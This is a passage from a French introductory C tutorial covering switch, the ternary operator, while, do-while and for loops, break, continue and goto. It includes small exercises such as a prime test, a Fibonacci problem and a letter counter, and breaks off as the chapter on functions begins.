: puts ( \"Bon travail, continue ainsi !\" ); break ; /* si note == 5 */ case 5 : puts ( \"Excellent !\" ); break ; /* si note est différente de 0, 1, 2, 3, 4 et 5 */ default : puts ( \"Euh... tu possedes une note improbable.\" ); puts ( \"Vivement le prochain chapitre qui permettra de demander a l'utilisateur de refaire son choix !\" ); break ; } return 0 ; } Comme dit précédemment, si la condition est vraie, le switch exécute toutes les instructions jusqu'au prochain break . Cela permet de faire des combinaisons comme celle-ci : int main ( void ) { int note ; printf ( \"Quelle note as-tu obtenu : \" ); scanf ( \"%d\" , & note ); switch ( note ) { /* si la note est comprise entre 0 et 4 inclus */ case 0 : case 1 : case 2 : case 3 : case 4 : printf ( \"Tu n'as pas la moyenne. \\n \" ); break ; /* si au contraire la note est égale ou supérieure à 5 */ case 5 : case 6 : case 7 : case 8 : case 9 : case 10 : printf ( \"Tu as la moyenne. \\n \" ); break ; default : printf ( \"Erreur : note impossible \\n \" ); break ; } return 0 ; } L'opérateur ternaire L'opérateur ternaire, qui est une autre façon de faire un test de condition, tient son nom du fait qu'il est le seul à avoir trois opérandes. En effet, il se compose comme suit : (condition) ? instruction si vrai : instruction si faux Les parenthèses ne sont pas obligatoires. Ce qu'il y a à retenir, c'est qu'il se comporte comme un if / else , tout en étant plus condensé et plus rapide à écrire. Voyez par vous-mêmes : #include <stdio.h> int main ( void ) { int heure ; scanf ( \"%d\" , & heure ); ( heure > 8 && heure < 20 ) ? printf ( \"Il fait jour.\" ) : printf ( \"Il fait nuit.\" ); return 0 ; } Il est également possible de l'écrire sur plusieurs lignes, même si cette pratique est moins courante : ( heure > 8 && heure < 20 ) ? printf ( \"Il fait jour.\" ) : printf ( \"Il fait nuit.\" ); Les ternaires peuvent sembler inutiles, surtout que s'ils sont mal employés ils rendent un programme moins lisible. Cependant, l'exercice suivant va vous prouvez que quand on les emploie bien, ce sont de bons alliés. Exercice Pour bien comprendre cette nouvelle notion, nous allons faire un petit exercice. Imaginez qu'on veuille faire un mini jeu vidéo dans lequel on affiche le nombre de coups du joueur. Seulement voilà, vous êtes maniaques du français et vous ne supportez pas qu'il y ait un 's' en trop ou en moins. Essayez de coder un programme dans lequel on demande à l'utilisateur le nombre de coups puis on affiche le résultat. Fini ? Voici la correction : #include <stdio.h> int main ( void ) { int nb_coups ; printf ( \"Donnez le nombre de coups : \" ); scanf ( \"%d\" , & nb_coups ); printf ( \" \\n Vous gagnez en %d coup%c\" , nb_coups , nb_coups > 1 ? 's' : ' ' ); return 0 ; } Ce programme utilise les ternaires pour condenser l'expression et aller plus vite dans l'écriture du code. Sans les ternaires il aurait fallu faire quelque chose comme : #include <stdio.h> int main ( void ) { int nb_coups ; printf ( \"Donnez le nombre de coups : \" ); scanf ( \"%d\" , & nb_coups ); printf ( \" \\n Vous gagnez en %d coup\" , nb_coups ); if ( nb_coups > 1 ) putchar ( 's' ); else putchar ( ' ' ); return 0 ; } Ce chapitre a été important, il vous a permis de comprendre les conditions en C : les booléens, if , else , else if , le switch et les ternaires. Il vous a aussi appris les opérateurs de comparaisons et les opérateurs logiques qui vous seront très utiles dans le prochain chapitre donc si vous n'avez pas très bien compris ou que vous n'avez pas tout retenu, je vous conseille de relire ce chapitre. Le chapitre suivant traitera des boucles, un moyen simple de refaire une action plusieurs fois. Les boucles Ce chapitre est la suite du précédent puisque nous allons aborder ici les boucles . Une boucle est un moyen de répéter des instructions selon une condition. Ces structures, dîtes itératives , que nous allons voir dans ce chapitre sont les suivantes : Nom de la structure de contrôle Ce qu'elle fait Boucle While...Do répète une suite d'instructions tant qu'une condition est respectée. Boucle Do...While répète une suite d'instructions tant qu'une condition est respectée. La différence, c'est que la boucle Do...While exécute au moins une fois cette suite d'instructions. Boucle For répète un nombre fixé de fois une suite d'instructions. La boucle while La première des boucles que nous allons étudier est la boucle while (qui signifie \"tant que\"). Celle-ci permet de répéter un bloc d'instruction tant qu'une condition est remplie. Syntaxe La syntaxe de notre boucle while est assez simple, comme vous pouvez en juger : while ( /* expression booleenne */ ) { /* bloc d'instruction à répéter */ } Exemple Je vous propose un petit exemple complètement inutile qui va illustrer tout ça : int i = 0 ; while ( i < 5 ) { printf ( \"La variable i vaut %d \\n \" , i ); i ++ ; } Dans cet exemple, on utilise une variable nommée i , mais on aurait très bien pu l'appeler compteur . Cependant, les programmeurs sont faignants, c'est pourquoi ils appellent généralement leurs variables i lorsqu'elles sont couplées avec les boucles (cela s'apparente presque à une convention de nommage). Mais pourquoi i en particulier ? Nous verrons cela quelques chapitres plus loin. En attendant, voici ce que ce code affiche à l'écran : La variable i vaut 0 La variable i vaut 1 La variable i vaut 2 La variable i vaut 3 La variable i vaut 4 Le fonctionnement est simple à comprendre : Au tout départ, notre variable i vaut 0. Étant donné que 0 est bien inférieur à 5, la condition est vraie, donc on rentre dans la boucle. On affiche la valeur de i . On incrémente i , qui vaut maintenant 1. On recommence la boucle. Ces étapes vont ainsi se répéter pour 1, 2, 3 et 4. Quand la variable i vaudra 5, la condition sera fausse, et le while ne sera alors pas exécuté. Boucles infinies Le point vital dans les boucles, c'est qu'elles puissent se terminer : si elles n'ont pas de quoi s'arrêter, elles s'exécuteront à l'infini ! Soyez donc très vigilants ! Par exemple, observez le code suivant : unsigned int i = 0 ; /* Ce qui équivaut à while(1) <--> Toujours vrai */ while ( i >= 0 ) { printf ( \"La variable i vaut %d \\n \" , i ); } Affiche dans la console sans jamais s'arrêter : La variable i vaut 0 La variable i vaut 0 La variable i vaut 0 ... Le code continuera jusqu'à ce que l'utilisateur arrête le programme. C'est ce qu'on appelle une boucle infinie . Les boucles infinies peuvent être utiles s'il y a une condition d'arrêt (une touche sur laquelle on appuie, un numéro à rentrer, etc) ; c'est d'ailleurs sur ce principe que fonctionnent de nombreux programmes comme les jeux vidéos : tant que l'utilisateur ne demande pas de quitter, on reste dans la boucle qui contient toutes les instructions du jeu. Exercice Pour bien faire rentrer ce qu'on a vu plus haut, rien ne vaut un petit exercice. On va vous demander de créer un morceau de code qui vérifie si un nombre est premier, et affiche le résultat à l'écran. Ce nombre, ce sera une variable nommée number , qui aura été déclarée précédemment dans notre code, mais vous pouvez aussi la saisir au clavier avec un scanf. Bref, peu importe. Nous allons vous donner quelques détails. Tout d'abord, on sait qu'un nombre x n'est pas divisible par un nombre y si x % y est différent de zéro. Ensuite, vous allez devoir utiliser une boucle while , et quelques structures de contrôles annexes. Et enfin, pour rappel, un nombre premier est divisible uniquement par 1 et par lui-même. Et maintenant, à vos claviers ! Ça y est, vous avez fini ? Alors votre code doit sûrement ressembler à quelque chose dans le genre : [secret]{ #include <stdio.h> int main ( void ) { int nombre , i = 2 ; puts ( \"nombre = \" ); scanf ( \"%d\" , & nombre ); while (( i < nombre ) && ( nombre % i != 0 )) { ++ i ; } if ( i == nombre ) { puts ( \"nombre est premier\" ); } else { puts ( \"nombre n'est pas premier\" ); } return 0 ; } } Les plus malins qui ont un bon niveau en mathématique savent déjà qu'il y a moyen de faire mieux que ce code naïf. On peut en effet utiliser de nombreux théorèmes et diverses astuces pour savoir si un nombre est premier. La correction présentée au-dessus va en effet prendre beaucoup de temps à vérifier qu'un nombre est premier et fait beaucoup de calculs inutiles. Par exemple, on n'est pas obligé de vérifier si le nombre* est divisible par des nombres supérieurs à sa racine carrée. La boucle do-while La deuxième boucle que nous allons voir est similaire à la première : il s'agit de la boucle do while . Fonctionnement Notre boucle do while fonctionne comme la boucle while , à un petit détail prêt : une boucle do while s'exécutera toujours au moins une fois, alors qu'une boucle while peut ne pas s'exécuter. Syntaxe En terme d'écriture, la première différence avec while est qu'ici le test de la condition se fait à la fin de la boucle et non au début. La deuxième chose notable est la présence d'un point-virgule tout à la fin. Il est obligatoire de le mettre, sinon la compilation échouera. Exemple Voici le même code que pour la boucle while , mais écrit avec une boucle do while : int i = 0 ; do { printf ( \"La variable i vaut %d \\n \" , i ); ++ i ; } while ( i < 5 ); Cet exemple affiche la même chose que le code utilisé comme exemple pour la boucle while : La variable i vaut 0 La variable i vaut 1 La variable i vaut 2 La variable i vaut 3 La variable i vaut 4 Autre exemple Comme je l'ai dit plus haut, notre boucle do while s'éxecute au moins une fois. Pour vous le prouver, voici un exemple : int main ( void ) { do { puts ( \"Boucle do-while\" ); } while ( 0 ); return 0 ; } Et ce code affiche pourtant ceci à l'écran : Boucle do-while Pourquoi ? Vous vous souvenez du chapitre précédant on nous avions vu les booléens ? On avait dit que 0 signifiait faux. Ainsi, le while ne s'exécute pas puisque la condition est fausse, alors que le do while s'exécute puisqu'il affiche bien « Boucle do-while » , alors que la condition est là encore fausse. Ce code prouve bien qu'une boucle do while s'exécute toujours au moins une fois. La boucle for La troisième et dernière boucle que nous allons voir est la boucle for . Celle-ci permet de répéter une suite d'instruction un certain nombre de fois, ce nombre de fois étant fixé par un ou plusieurs compteurs. Fonctionnement Une boucle for se décompose en trois parties. L' initialisation du compteur : on prépare le compteur en l'initialisant à la valeur que l'on veut (le plus souvent c'est 0). La condition : comme pour les deux autres boucles, il faut une condition. Tant qu'elle est vraie, la boucle s'exécute ; elle se stoppe dès qu'elle devient fausse. La modification du compteur : cette étape modifie le compteur. Même s'il s'agit le plus souvent d'une incrémentation, on peut utiliser toutes les opérations que l'on veut. Petit détail : l'initialisation se fait une seule fois, avant de rentrer dans la boucle, et non à chaque tour de boucle. Par contre, la modification du compteur et le test de la condition ont lieu à chaque tour de boucle. Une boucle for peut être vue comme une sorte de spécialisation d'une boucle while . En fait, une boucle for est strictement équivalente à ce code : Initialisation du compteur ; while ( condition ou expression booléenne ) { Instructions de la boucle ; Modification du compteur ; } Syntaxe La syntaxe de cette boucle est assez différente des deux autres, mais elle n'en est pas moins utile. Pour utiliser une telle boucle, on doit procéder comme ceci : for (initialisation du compteur ; condition ; modification du compteur) { Instructions; } Attention à bien déclarer le compteur avant la boucle, en C89 il est interdit d'écrire quelque chose comme for(int i =0; i <9; i++) . Vous pourrez le faire à partir du C99. Exemple Je pense qu'un exemple vous aidera à bien saisir tout ça : int variable ; for ( variable = 0 ; variable < 10 ; variable ++ ) { printf ( \"variable vaut %d \\n \" , variable ); } Ce code affichera en sortie : variable vaut 0 variable vaut 1 variable vaut 2 variable vaut 3 variable vaut 4 variable vaut 5 variable vaut 6 variable vaut 7 variable vaut 8 variable vaut 9 Amusez-vous à changer l'initialisation, la condition ou la modification du compteur pour voir les changements. Il est essentiel de bien comprendre cette boucle qui est moins évidente que les deux autres, cependant très utilisée ; nous verrons mieux son intérêt et son utilité quand nous avancerons dans le cours. Exercice Nous allons nous entraîner avec quelque chose de vraiment basique. Nous allons calculer la somme de tous les nombres compris entre 1 et N. En clair, si je vous donne un nombre N, vous allez devoir calculer $1 + 2 + 3 + ... + (N-2) + (N-1) + N$ . Bien sûr, vous allez devoir utiliser une boucle. A vos claviers ! Si c'est fini, voici la correction : [secret]{ #include <stdio.h> int main ( void ) { const unsigned int n = 250 ; unsigned int somme = 0 ; unsigned int i ; for ( i = 1 ; i <= n ; ++ i ) { somme += i ; } printf ( \"%d \\n \" , somme ); return 0 ; } } Comme quoi, rien de bien compliqué. Une petit remarque cependant : ceux qui s'intéressent un peu aux mathématiques ont surement résolu cet exercice sans boucle. En effet, il faut savoir que cette somme peut se calculer plus facilement : elle vaut exactement $\\frac {N \\times (N+1)} {2}$. Utilisation avancée Les boucles for ne vous ont pas encore livré tous leurs secrets. Comme quoi, on en apprend toujours plus sur le C, même quand on pense déjà bien le connaître. Plusieurs compteurs Le nombre de compteurs ou de conditions n'est pas limité, comme le prouve le code suivant. for ( i = 0 , j = 2 ; i < 10 && j < 12 ; i ++ , j += 2 ) Ici, on définit deux compteurs i et j initialisés respectivement à 0 et 2. On exécute le contenu de la boucle tant que i est inférieur à 10 et que j est inférieur à 12, et on augmente i de 1 et j de 2 à chaque tour de boucle. Le code est encore assez lisible, cependant la modération est de mise, un trop grand nombre de paramètres rendant le for illisible. Boucles imbriquées Petite précision : il est possible d' imbriquer les boucles. Cela consiste simplement à mettre une ou plusieurs boucles dans une autre, comme ceci : for ( i = 0 ; i < 1000 ; ++ i ) { for ( j = i ; j < 1000 ; ++ j ) { /* code */ } } Et cela marche aussi avec des boucles while , do while , etc. On peut ainsi imbriquer une boucle while dans une boucle do while , imbriquer une boucle while dans une boucle for , et j'en passe. Cela peut servir. Pour donner un exemple, imaginons que je veuille savoir quelles sont les additions de deux nombres entiers dont la somme vaut 1000. En clair, je veux savoir quelles sont les valeurs possibles de a et de b tels que a + b = 1000. Pour cela, je peux résoudre le problème de manière naïve et utiliser deux boucles imbriquées pour tester toutes les possibilités. for ( i = 0 ; i <= 1000 ; ++ i ) { for ( j = i ; j <= 1000 ; ++ j ) { if ( i + j == 1000 ) { printf ( \"%d + %d = 1000 \\n \" , i , j ); } } } Branchements inconditionnels Dans ce chapitre, ainsi que dans le chapitre précédent, on a vu comment modifier l'exécution de notre programme en fonction de certaines conditions. Ainsi, notre programme peut faire autre chose que mécaniquement passer à l'instruction suivante et peut recommencer son exécution à un autre endroit, suivant qu'une condition soit réalisée ou pas. Pour ce faire, on utilise des structures de contrôles. Au niveau de notre processeur, ces structures de contrôle sont fabriquées avec ce qu'on appelle des instructions de branchement conditionnelles : ce sont des instructions qui vont faire reprendre notre programme à un autre endroit si une condition est vraie, et qui ne font rien sinon. Ceux qui veulent savoir comment on utilise ces branchements pour fabriquer ces structures de contrôles peuvent aller lire le début de ce tutoriel (les trois premières sous-parties) : Structures de contrôle en assembleur . Mais la plupart du temps, notre ordinateur supporte aussi des instructions de branchement inconditionnels. Ces instructions vont faire reprendre l'exécution de notre programme à un endroit bien précis, quelle que soit la situation. Celles-ci n'agissent pas suivant ce que leur dit une condition, mais vont toujours faire reprendre notre programme à un endroit bien précis. Alors certes, il s'agit d'instructions de notre processeur, qui sont souvent inaccessibles en C. Mais le langage C fournit quelques fonctionnalités qui fonctionnent exactement comme des branchements inconditionnels. Ils sont souvent utilisés de concert avec nos structures de contrôle, pour les améliorer, ou pour qu'elles fassent ce qu'il faut. Il existe ainsi trois grands branchements inconditionnels en C : ​ celui qui permet de passer au tour de boucle suivant, sans finir celui en cours : continue ; * celui qui permet (entre autres) de quitter la boucle en cours : break ; celui qui permet de sauter carrément dans un autre morceau de code goto . Voyons un peu plus en détail ces branchements inconditionnels. break Nous avons déjà étudié le rôle de break au sein de l'instruction switch : il permettait simplement de quitter notre switch pour reprendre immédiatement après. Eh bien, sachez qu'on peut aussi l'utiliser avec des boucles. Son but ? Permettre de quitter une boucle (ou un switch , comme on l'a déjà vu), pour reprendre immédiatement après. Boucle ou structure de contrôle simple Pour illustrer ça, prenons un algorithme tout simple : Pour (i = 0 ; i < 10 ; i++) { Si i == 5 Quitter la boucle; Sinon afficher i; } Notre but est de quitter si jamais la variable i atteint la valeur 5. Alors pour vous entrainer, essayez de coder vous-même la boucle sans regarder la solution. [secret]{ int i ; for ( i = 0 ; i < 10 ; i ++ ) { if ( i == 5 ) break ; printf ( \"i = %d \\n \" , i ); } Et voici le résultat à l'exécution : i = 0 i = 1 i = 2 i = 3 i = 4 L'exécution de la boucle a bien été arrêtée par break . } Structures de contrôle imbriquées Il est important de préciser que break ne permet de sortir que d'une seule boucle (ou d'une seule structure de contrôle de type if , else if , etc.). Ainsi, dans le cas de boucles imbriquées, on reviendra à la précédente. #include <stdio.h> int main ( void ) { int i ; for ( i = 0 ; i < 10 ; i ++ ) { printf ( \"[for] i = %d \\n \" , i ); while ( i < 5 ) { if ( i == 4 ) break ; printf ( \"[while] i = %d \\n \" , i ); i ++ ; } } return 0 ; } [for] i = 0 [while] i = 0 [while] i = 1 [while] i = 2 [while] i = 3 [for] i = 5 [for] i = 6 [for] i = 7 [for] i = 8 [for] i = 9 Dans ce code, il y a une boucle for qui contient une boucle while . Au départ, i vaut 0, et ainsi la condition est vraie et on rentre dans la boucle. On affiche la variable, et dès que i vaut 4, on quitte la boucle. Comme la condition du while est fausse, on ne rentre plus dedans, mais la boucle for continue de s'exécuter, et affiche les cinq valeurs suivantes de i . continue Le deuxième mot-clef est continue . Son rôle est d'arrêter l'itération en cours et de passer à la suivante. En gros, on peut dire que continue permet de terminer le tour de boucle en cours, et fait reprendre immédiatement au tour de boucle suivant. Prenons le même code algorithme que précédemment : Pour (i = 0 ; i < 10 ; i++) { Si i == 5 continue; Sinon afficher i; } Qui est capable me dire ce que le code une fois traduit en C affichera ? [secret]{ i = 0 i = 1 i = 2 i = 3 i = 4 i = 6 i = 7 i = 8 i = 9 } On remarque que quand i a été mis à 5, la condition if (i == 5) est devenue vraie et continue a zappé l'itération en cours. goto Le troisième et dernier mot-clef que je souhaite vous présenter est goto . Ce mot-clef sert à sauter vers une autre partie du code. Il permet de reprendre l'exécution du programme à l'endroit qu'on veut. Pour préciser l'endroit où l'on veut reprendre notre programme, le langage C fournit ce qu'on appelle des labels . Ces labels permettent de nommer une ligne de code, une instruction particulière, en lui donnant un nom. Pour identifier la ligne de code à laquelle on souhaite faire reprendre notre programme, il suffit ainsi d'ajouter un label à notre ligne de code, en rajoutant le nom du label suivi d'un caractère : devant notre instruction. Pour reprendre l'exécution du programme à une ligne de code bien précise, il suffit d'utiliser le mot-clé goto , suivi du nom du label de la ligne de code correspondante. Exemple Voici un algorithme tout simple : Pour (i = 0 ; i < 10 ; i++) { Si i == 5 Sautez à l'étiquette Erreur; Sinon afficher i; } Erreur: Afficher que i vaut 5 Dans notre exemple, le label n'est autre que erreur . Ce label est défini plus bas dans le code : il est attaché à notre instruction qui affichera à l'écran que la variable vaut 5. Essayez de transposer cet algorithme en C. [secret]{ int i ; for ( i = 0 ; i < 10 ; i ++ ) { if ( i == 5 ) goto Erreur ; printf ( \"i = %d \\n \" , i ); } Erreur : puts ( \" \\n i vaut 5\" ); Et voici le résultat à l'exécution : i = 0 i = 1 i = 2 i = 3 i = 4 i vaut 5 } On voit bien que quand i atteint la valeur 5, le programme saute au label Erreur et affiche bien i vaut 5 . Le label est ici après goto , mais peut très bien se trouver avant. Goto Statement Considered Harmful Il me faut cependant vous prévenir : de nos jours, il est tout de même assez rare qu'on utilise des goto , et certains langages de programmation ne permettent même pas de l'utiliser ! Pourquoi ? Eh bien en fait, il faut savoir qu'autrefois, goto était assez relativement utilisé par les programmeurs. Quand je dis autrefois, c'était avant les années 1960-1970. Nul doute que vous n'étiez pas encore nés à cette époque. À cette époque, on n'utilisait pas vraiment de structures de contrôles, et les programmeurs créaient des programmes en utilisant pas mal de goto pour compenser. Mais cet usage du goto a fini par être de plus en plus critiqué au fil du temps. Première attaque contre le goto : en 1966, deux mathématiciens, Böhm et Jacopini, prouvèrent que l'on pouvait se passer totalement de goto en utilisant des structures de contrôle. La déchéance de goto était en marche. Dans notre exemple vu plus haut, goto est effectivement superflu et peux facilement être remplacé par autre chose. int i ; /* code plus court et plus lisible */ for ( i = 0 ; i < 10 ; i ++ ) { if ( i == 5 ) { puts ( \"i vaut 5\" ); break ; } printf ( \"i = %d \\n \" , i ); } Mais certains programmeurs continuèrent d'utiliser du goto , en disant que c'était plus facile de programmer ainsi. Alors vint le coup de grâce final ! En mars 1968, un informaticien du nom d' Edsger Dijkstra écrivit un article qui fit sensation. Cet article portait le nom suivant : Goto Statement Considered Harmful . Dans cet article, Dijkstra porta de nombreuses critiques sur le goto , et préconisait de remplacer celui-ci par une utilisation judicieuse des structures de contrôles qu'on vient de voir dans ce chapitre et dans le chapitre précédent. Cet article lança un véritable débat dans les milieux académiques ainsi que parmi les programmeurs. Au final : goto perdit la bataille, l'usage des structures de contrôle usuelles se répandit dans le monde comme une trainée de poudre. Le principal reproche qui est fait à ce pauvre goto est qu'il a tendance à rendre le code illisible. En comparaison, un code dans lequel on trouve des structures de contrôle est beaucoup plus compréhensible par un humain. C'est pour ce genre de raisons que l'usage de goto en C est très fortement déconseillé, en particulier pour les débutants. Je vous parle de goto par souci d'exhaustivité, mais sachez qu'il est aujourd'hui rarement utilisé. L'un des très rares cas dans lesquels ce mot-clef prend son intérêt, c'est la gestion des erreurs. Cependant, nous ne verrons pas ce cas dans ce tutoriel. En attendant de découvrir comment bien utiliser goto , je vous recommande de ne pas l'utiliser. Exercices On ne le répète jamais assez, pratiquez ! Voici donc quelques exercices permettant de s'entraîner et de s'améliorer. Calcul du PGCD de deux nombres Commençons par une curiosité mathématique très prisée en programmation. Nous allons programmer un des premiers algorithmes qui aie été inventé à l'époque de l'Antiquité. On pourrait croire qu'il est tout de même assez récent et date des débuts de l'informatique. Mais ce n'est pas le cas : il a été inventé par Euclide, mathématicien de la Grèce antique, qui est considéré comme le créateur de la géométrie. Énoncé Mais cet algorithme n'est pas vraiment un algorithme géométrique. Cet algorithme effectue un traitement simple : il calcule le PGCD de deux nombres. Pour rappel, le PGCD de deux nombres a et b, n'est rien d'autre que le plus grand nombre qui peut diviser à la fois a et b. Cet algorithme est très simple. On suppose que a est supérieur à b . On commence par affecter la valeur de b à a , ensuite, puis on attribue la valeur de r à b (le reste). Ensuite on calcule r de la division euclidienne (d'entiers) de a par b ; et on recommence toutes ces étapes jusqu'à ce que le reste soit nul. On a alors trouvé le résultat : c'est le b qui a été obtenu à la fin de ce processus. Avec cette explication, vous avez tout ce qu'il vous faut : à vos claviers ! Correction Cette correction est disponible ici . Une overdose de lapins C'est mignon un lapin, vous ne trouvez pas ? Si vous avez répondu oui, alors vous allez être ravi par cet exercice. Énoncé Au 13ème siècle, un mathématicien italien du nom de Leonardo Fibonacci posa un petit problème dans un de ses livres, qui mettait en scène des lapins. Ce petit problème mis en avant une suite de nombre particulière, nommée la suite de Fibonnaci , nommée du nom de son inventeur. Il fit les hypothèses suivantes. ​ Le premier mois, on place un couple de deux lapins dans l'enclos. * Les lapins se reproduisent tous les deux mois. * Dès qu'il le peut, tout couple de lapins capable d'avoir des enfants donne naissance à deux lapereaux, et donc à un nouveau couple. Et enfin, pour éviter tout problème avec la SPA, les lapins ne meurent jamais. Le problème est le suivant : combien il y a-t-il de couples (de paires) de lapins dans l'enclos au n-ième mois ? Le but de cet exercice est de coder un petit programme qui fasse le calcul automatiquement, et qui affiche le résultat sur la console. Indice [secret]{ Le fait est que ce problème est assez simple à résoudre en remarquant un petit truc. Si on dispose de x couples de lapins au mois N, celui donnera naissance à un nouveau couple deux mois plus tard. Deux mois plus tard, on se retrouvera donc avec x nouveaux couples de lapins, venant de la reproduction des couples d'il y a deux mois, auquel il faut ajouter les lapins qui étaient déjà là le mois d'avant. Autrement dit, si je note le nombre de lapins au n-ième mois $Fn$, on a : $F_n+2 = F_n+1 + F_n$. Ce qui peut aussi s'écrire $F_n = F_n-1 + F_n-2$. Ensuite, au mois numéro 1, on a un seul couple de lapins. $F_1 = 1$. En enfin, au mois numéro 0, on a 0 lapins : l'expérience n'a pas encore commencée : $F_0 = 0$. En sachant ça, vous pouvez aisément coder le programme demandé. } Correction Et voilà, notre petit problème avec les lapins est résolu . Sympathique, non ? Des pieds et des mains pour convertir mille miles Si vous avez déjà voyagé en Grande-Bretagne ou aux États-unis, vous savez que les unités de mesure utilisées dans ces pays sont différentes des nôtres. Au lieu de notre cher système métrique, dont les stars sont les centimètres, mètres et kilomètres, nos amis outre-manche et outre-atlantique utilisent le système impérial, avec ses pouces, pieds et miles , voire lieues et furlongs ! Et pour empirer les choses, la conversion n'est pas toujours simple à effectuer de tête ... Aussi, la lecture d'un ouvrage tel que Le Seigneur des Anneaux , dans lequel toutes les distances sont exprimées en unités impériales, peut se révéler pénible. Votre mission Grâce au langage C, nous allons aujourd'hui résoudre tous ces problèmes ! Votre mission, si vous l'acceptez, sera en effet d'écrire un programme affichant un tableau de conversion entre miles et kilomètres. Le programme ne demande rien à l'utilisateur, mais doit afficher quelque chose comme ceci : Km Miles 5 8 10 16 15 24 20 32 25 40 30 48 Autrement dit, le programme compte les kilomètres de 5 en 5 jusqu'à 30, et affiche à chaque fois la valeur correspondante en miles . Un mile vaut exactement 1.609 344 km, cependant, nous allons utiliser une valeur approchée : nous prendrons huit-cinquièmes de kilomètre (soit 1.6km). Autrement dit, $1$ km $= \\frac{8}{5}$ miles. Bon courage et bonne chance ! Un indice ? [secret]{ Ne lisez cette section que si vous avez déjà cherché par vous-mêmes, mais que malgré vos efforts, vous êtes dans une impasse. Que doit faire notre programme ? Tout d'abord, nous devons afficher la première ligne, qui dit « Km - Miles ». Ceci ne comporte pas de difficulté. Ensuite, nous devons compter jusqu'à 30 de 5 en 5, et afficher la conversion en miles à chaque fois. Pour compter, il nous faudra utiliser une variable, qui prendra les valeurs successives du kilométrage. Nous compterons tant que la variable n'aura pas atteint 30 ; à chaque étape, nous afficherons la conversion et ajouterons 5. } Correction ! Si vous avez lu l'indice, vous devriez normalement y arriver en reprenant les chapitres appropriés du cours. Voici un exemple de code possible . Pour aller plus loin, vous pouvez vous amuser à faire la conversion inverse (miles vers km) ou à faire un affichage plus joli. Si vous vous sentez d'attaque, vous pouvez même demander les bornes et le pas à l'utilisateur. Pour parfaire le tout, vous pouvez même intégrer plusieurs unités différentes et demander à l'utilisateur laquelle il souhaite convertir ! Puissances de trois Passons à un exercice un peu plus difficile, du domaine des mathématiques. Essayez de le faire même si vous n'aimez pas les mathématiques. Consignes Vous devez vérifier si un nombre est une puissance de trois, et afficher le résultat. De plus, si c'est le cas, vous devez afficher l'exposant qui va avec. Le nombre en question est stocké dans une variable de type int . Celle-ci a été déclarée avant dans votre code, et peut venir d'une entrée, ou être stockée quelque part, bref. À vos marques... Prêts ? Codez ! Un indice ? Comment savoir si un nombre est une puissance de trois ? Si vous êtes perdu dans cet exercice pas si facile, lisez les lignes suivantes. [secret]{ Pour savoir si un nombre est une puissance de trois, vous pouvez utiliser le modulo. Attention cependant : si le reste vaut 0, le nombre n'est pas forcément une puissance de trois. Un dernier indice ? Si le nombre est bien une puissance, le reste est forcément non-nul. } Correction ! Ça y est ? Terminé ? Vous pensez avoir tout bon ? Alors voici la correction . Comme quoi, ce n'était pas bien compliqué ! } La disparition : le retour Connaissez-vous le roman La Disparition ? Il s'agit d'un roman français de Georges Perec, publié en 1969. Sa particularité est qu'il ne contient pas une seule fois la lettre « e ». On appelle ce genre de textes privés d'une lettre des lipogrammes . Celui-ci est une prouesse littéraire, car la lettre « e » est la plus fréquente de la langue française : elle représente une lettre sur six en moyenne ! Le roman faisant environ 300 pages, il a sûrement fallu déployer des trésors d'inventivité pour éviter tous les mots contenant un « e ». Si vous essayez de composer un tel texte, vous allez vite vous rendre compte que vous glissez souvent des « e » dans vos phrases sans même vous en apercevoir. Nous avons besoin d'un vérificateur qui nous sermonnera chaque fois que nous écrirons un « e ». C'est là que le langage C entre en scène ! Votre mission Écrivez un programme qui demande à l'utilisateur de taper une phrase, puis qui affiche le nombre de « e » qu'il y a dans celle-ci. Une phrase se termine toujours par un point « . », un point d'exclamation « ! » ou un point d'interrogation « ? ». Pour effectuer cet exercice, il sera indispensable de lire la phrase caractère par caractère. Exemple : Entrez une phrase : > >> Bonjour, comment allez-vous ? Attention, 2 'E' ont été repérés dans votre phase ! Pour améliorer votre programme, vous pourriez demander à l'utilisateur de quelle lettre il souhaite se passer, plutôt que de toujours compter les « e ». Notez qu'il existe un logiciel, infiniment plus évolué, qui fait ce genre de travail : grep . Cet utilitaire permet en fait de retrouver certaines expressions (lettres, mots ou autres) dans un fichier et de les afficher. Il peut également compter le nombre de fois qu'une expression apparaît dans un fichier. Quoi qu'il en soit, à vous de jouer ! Un indice ? Avez-vous vraiment bien cherché ? Pourquoi ne pas aller faire un tour, puis revenir pour tenter de coder avec les idées fraîches ? Non, vraiment, vous voulez de l'aide ? [secret]{ La première chose à faire est d'afficher un message de bienvenue, afin que l'utilisateur sache quel est votre programme. Ensuite, Il vous faudra lire les caractères tapés, un par un, jusqu'à ce qu 'un point (normal, d'exclamation ou d'interrogation) soit rencontré. Dans l'intervalle, il faudra compter chaque « e » qui apparaîtra. Enfin, il faudra afficher le nombre de « e » qui ont été comptés, si présents. } Correction Là encore, il ne s'agit que d'une solution parmi tant d'autres. Aviez-vous pensé à gérer les « E » majuscules ? Si vous n'êtes pas arrivé à coder cet exercice, encore une fois, essayez de le refaire en cachant la solution. Persévérez jusqu'à ce que vous y arriviez tout seul. Les boucles sont assez faciles à comprendre, la seule chose dont il faut se souvenir étant de faire attention de bien avoir une condition de sortie pour ne pas tomber dans une boucle infinie. Le prochain chapitre montrera comment gagner du temps et de se faciliter la tache en découpant habilement son code. Les fonctions Nous avons découvert beaucoup de nouveautés dans les chapitres précédents. Nos programmes commencent à grossir, même s'ils restent encore modestes. C'est pourquoi il est important d'apprendre à découper son programme en fonctions . A quoi ca sert ? Les fonctions ne sortent pas de nulle part : si on les a inventées, c'est qu'elles peuvent servir à quelque chose. Reste à comprendre pourquoi. Car les fonctions sont des inventions qui répondent à des besoins bien précis : grandement faciliter la vie du programmeur ! Lorsque vous créez un programme, le résultat sera une grosse suite d'instructions placées les unes à la suite des autres. Et parmi cette gigantesque suite d'instructions, il y a souvent des \"sous-suites\", des paquets d'instructions, des morceaux de code qui reviennent régulièrement et qui sont présents en plusieurs exemplaires dans le programme final. Ces sous-suites servent pratiquement toujours à exécuter une tâche bien précise et ont presque toujours une signification importante pour le programmeur. Par exemple, il va exister une de ces sous-suites qui va servir à calculer un résultat bien précis, communiquer avec un périphérique, ou autre chose encore. Sans fonctions Sans utiliser de fonctions, ces suites d'instructions sont présentes en plusieurs exemplaires dans le programme. Le programmeur doit donc recopier à chaque fois ces suites d'instructions, ce qui ne lui facilite pas la tâche. Et dans certains programmes, devoir recopier plusieurs fois la séquence d'instruction qui permet d'agir sur un périphérique ou de faire une action spéciale est franchement barbant ! De plus, ces suites d'instructions sont présentes plusieurs fois dans le programme final, exécuté par l'ordinateur. Et elles prennent de la place inutilement ! Mine de 